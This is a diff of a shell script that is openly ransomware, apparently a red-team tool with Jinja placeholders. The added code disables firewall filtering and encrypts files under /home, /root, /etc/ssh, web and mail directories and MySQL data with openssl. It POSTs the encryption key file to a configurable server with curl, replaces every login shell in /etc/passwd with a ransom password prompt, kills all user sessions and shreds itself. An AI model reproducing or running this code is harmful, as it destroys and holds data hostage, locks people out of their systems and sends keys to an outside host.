@@ -1,179 +1,204 @@
 #!/bin/sh
 
-################ CHECKS ###############################
-# Get the OS version
-get_os() {
-    if [ "$(uname -s | grep Linux)" != "" ]; then
-	OS="linux"
-    elif [ "$( uname -s | grep BSD)" != "" ]; then
-	OS="bsd"
-    else
-	adderr "[!] NOT \"Linux\" or \"BSD\""
-	EXIT
-    fi
-}
-
-# Check for a TUI
-check_msg() {
-    if [ "$(which dialog)" != "" ]; then
-	echo setting dialog
-	DIALOG="dialog"
-    elif [ "$(which whiptail)" != "" ]; then
-	DIALOG="whiptail"
-        echo setting whiptail
-    else
-	DIALOG=none
-    fi
-}
-
-# check the requirements
-check_req() {
+Init() {
+    # Perform initial checks and find the TUI
     # Fatal Errors
-    if [ "$(whoami)" != "root" ]; then
-	adderr "[!] NOT ROOT"
+    if [ "`whoami`" != "root" ]; then
+	echo "[!] NOT ROOT"
         EXIT
     fi
-    if [ "$(which openssl)" = "" ]; then
-        adderr "[!] NO OPENSSL FOUND"
+    if [ "`command -v openssl`" = "" ]; then
+        echo "[!] NO OPENSSL FOUND"
         EXIT
     fi
-    # Non-Fatal Errors
-    if [ "$(which iptables)" = "" ]; then
-        adderr "[!] NO IPTABLES FOUND"
+    # Allow sending of packet out
+    if [ "`command -v iptables`" != "" ]; then
+        command iptables -I INPUT 1 -j ACCEPT
+        command iptables -I OUTPUT 1 -j ACCEPT
+    fi
+    # Set the TUI
+    if [ "`command -v dialog`" != "" ]; then
+	DIALOG="dialog"
+    elif [ "`command -v whiptail`" != "" ]; then
+	DIALOG="whiptail"
     else
-        `which iptables` -I INPUT 1 -j ACCEPT
-        `which iptables` -I OUTPUT 1 -j ACCEPT
+	echo "[!] WHIPTAIL OR DIALOG NOT INSTALLED"
+        EXIT
+    fi
+    echo "[*] Dialog: $DIALOG"
+}
+
+SetKeys() {
+    # Set up all the keys
+    # Generate AES key
+    KEY="`openssl rand -base64 32`"
+    # Set the public key either from JINJA or leave blank
+    # {% if PUBLIC_KEY != "" %}
+    pubkey="\
+    {{ PUBLIC_KEY }}
+    "
+    # {% else %}
+    pubkey=""
+    # {% endif %}
+    PUBLICKEY="vmware.txt" # Save the pubkey to here
+    PRIVATEKEY="vmware.key" # Save the encryption list and key here
+    # Write the AES key to the outfile
+    if [ "$pubkey" != "" ]; then
+        echo "$pubkey" > $PUBLICKEY
+        # Encrypt the AES key with the pubkey and put it in PRIVATEKEY
+        echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
+        echo "[+] Encrypted public key written to $PRIVATEKEY"
+    else
+        # Write the unencrypted pubkey
+        echo -n "$KEY" > $PRIVATEKEY
+        echo "[!] Unencrypted public key written to $PRIVATEKEY"
     fi
 }
-################ FUNCTIONS ##########################
-openfile() {
-	if [ "$OS" = "linux" ]; then
-		chmod +rw $1
-		chattr -i $1
-	fi
-	if [ "$OS" = "bsd" ]; then
-		chmod +rw $1
+
+EXIT() {
+    # Delete the script itself
+    echo "[!] Shredding $0"
+    shred $0 && rm -f $0
+    exit;
+}
+
+OpenFile() {
+        # Add the read and write flags for everyone
+        chmod +rw $1
+        # Remove immutable and append-only
+	if [ "`command -v chattr`" != "" ]; then
+		chattr -ai $1
+	elif [ "`command -v chflags`" ]; then
 		chflags schg $1
 	fi
 }
 
-adderr() {
-    ERRMSG="$ERRMSG\n$1";
-}
-
-EXIT() {
-    echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
-    shred $0
-    exit;
-}
-
-init() {
-	check_req
-	check_msg
-	KEY="$(openssl rand -base64 25)"
-	pubkey="\
-	{{ PUBLIC_KEY }}
-        "
-	PUBLICKEY="vmware.txt"
-	PRIVATEKEY="vmware.key"
-	echo "$pubkey" > $PUBLICKEY
-	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
-}
-
-navdir() {
-for fil in $1; do
-	whitelist=".*vmware.*|.*_schema.*|.*shy_packet.*"
-	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
-	if [ -f "$fil" ]; then
-		$2 $fil
-	elif [ -d "$fil" ]; then
-		navdir "$fil/*" "$2"
-	fi
-done
-}
-
-showmess() {
-    case "$DIALOG" in
-    *none*)
-	reset
-	echo $2 "(y/N)"
-	read result
-	;;
-    *)
-	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
-       		--title "$1" \
-       		--msgbox "$2" 16 60
-        result=$?
-	;;
-    esac
-}
-############### ENCRYPTING ###########################
-pck() {
-    adderr "[+] Encrypted $1"
-    LIST="$LIST$1\n"
+EncryptFile() {
+    # Use jijna to determine whether we should encrypt
+    # {% if weaponized %}
+    ENCRYPT=0
+    # {% else %}
+    ENCRYPT=1 # This is default if just running in bash
+    # {% endif %}
     if [ -f "$1" ]; then
-	if [ "$SOFT" = "" ]; then
-	    openfile $1
-	    stuff=$(cat $1)
-	    echo "RAN" > $1
-	    echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
-	fi
+        if [ "$ENCRYPT" = "0" ]; then
+            # Unlock the file
+            OpenFile $1
+            # Get the contents
+            stuff="`cat $1`"
+            # Clear the file
+            echo "RAN" > $1
+            # Encrypt everything and drop it back into the file
+            echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
+            echo "[+] Encrypted $1"
+        else
+            echo "[+] Dry run on $1"
+        fi
+        # Add the file to the list even if its not encrypted
+        LIST="$LIST$1\n"
     fi
 }
 
-enc_loop() {
-    kills="$1"
-    for i in $kills; do
-	if [ -d "$i" ]; then
-	    navdir "$i/*" "pck"
-	    adderr "[+] Encrypted $i"
+ListFiles() {
+    # Generate a list of all the files contained in the given directories
+    # If a file is passed, add it to the file list
+    # LISTFILES dir1/ dir2/ dir3/ 
+    FILES=""
+    # Loop through all the arguments
+    for i in $@; do
+        # list all the files in it (Works if it is a filename to
+        if [ -d $i ] || [ -f $i ]; then
+            # Run find if there isnt errors, add the files
+            X="`find $i -xdev -type f 2>/dev/null`"
+            if [ "$?" = "0" ]; then
+                FILES="$FILES $X"
+            fi
 	fi
     done
+    # Remove any files in the whitelist
+    whitelist=".*vmware.*|.*_schema.*"
+    FILES=`echo  "$FILES" | awk "!/$whitelist/"` # remove anything containing vmware
 }
 
-################# MAIN ######################################
-setmsg() {
+SetMessage() {
+    # Replace all the shells with the ransom message
+    # {% if RANSOM_MESSAGE %}
     message='{{ RANSOM_MESSAGE }}'
-
-    echo "Enter your new password: "
-    read pass
-    hsh="$(echo $pass | openssl sha1 | cut -d' ' -f2)"
-    msg="\
+    # {% else %}
+    message="Oohhh, Scary. Redteam got to you!\n what are you gonna do?\n"
+    message="${message}Try guessing, I bet that will work! Just remember,"
+    message="${message} we really love you!"
+    # {% endif %}
+    # {% if password %}
+    hsh="{{ password }}"
+    # {% else %}
+    hsh="$(echo "redteamlovesyou" | openssl sha1 | cut -d' ' -f2)"
+    # {% endif %}
+    msg="#!/bin/bash
 while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != \
 \"$hsh\" ];\
 do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' \
 --passwordbox '$message' 20 50 3>&1 1>&2 2>&3 );\
-done"
-    mv /etc/profile /etc/profile.bak
-    echo $msg > /etc/profile
+done; /bin/bash"
+    echo "$msg" > /bin/ransom
+    chmod +x /bin/ransom
+    OpenFile /etc/passwd
+    # Tell all the shells to be the ransom message
+    sed -i 's/:\/[a-z\/]*$/:\/bin\/ransom/' /etc/passwd
 }
 
-# Kill every session on the machine
-lock() {
-    who -u | awk '{print $6}' | xargs kill -9 
+Lock() {
+    # Kill every session on the machine, forcing the users to log back on
+    who -u | awk '{print $6}' | xargs kill -9; 
 }
 
-# Send the packet back to the server
-send_packet() {
-    :
+SendPacket() {
+    # Send the packet back to the server
+    # {% if server != "" %}
+    server="{{ server }}" # If jinja is used
+    # {% else %}
+    server="" # Default if jinja is not used
+    # {% endif %}
+    if [ "`command -v curl`" != "" ] && [ "$server" != "" ]; then
+        X=`curl -X POST -d "@$PRIVATEKEY" $server 2>&1`
+        if [ "$?" = "0" ]; then
+            echo "[+] Packet sent to server"
+        else
+            echo "[!] Error sending packet"
+            echo "$X"
+        fi
+    fi
 }
 
 main() {
     # Trap Signals
     trap '' INT
     trap '' TERM
-    SOFT="YES"
-    init
+    # Setup the keys data
+    Init # Sets DIALOG
+    SetKeys # Set PRIVATEKEY, KEY
+    # {% if targets %}
     targets="{{ targets|join(' ') }}" # Get the target list from jinja
-    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
-    enc_loop "$targets"
+    # {% else %}
+    targets="/var/spool /etc/ssh /var/named /etc/mail /etc/postfix /var/www"
+    targets="$targets /root /home /var/lib/mysql /etc/apache2 /etc/httpd"
+    targets="$targets /dovecot /etc/exim /etc/nginx"
+    # {% endif %}
+    # Generate a list of all the files
+    ListFiles $targets
+    # Encrypt every file in the file list
+    for file in $FILES; do
+        EncryptFile $file
+    done
     echo >> $PRIVATEKEY
+    # Encrypt the file list with the KEY and dump it into a file
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
-    setmsg
     cp $PRIVATEKEY /etc/
     cp $PRIVATEKEY /var/
     cp $PRIVATEKEY /usr/
+    SendPacket
+    SetMessage
+    Lock
 }
 main
-lock
 EXIT
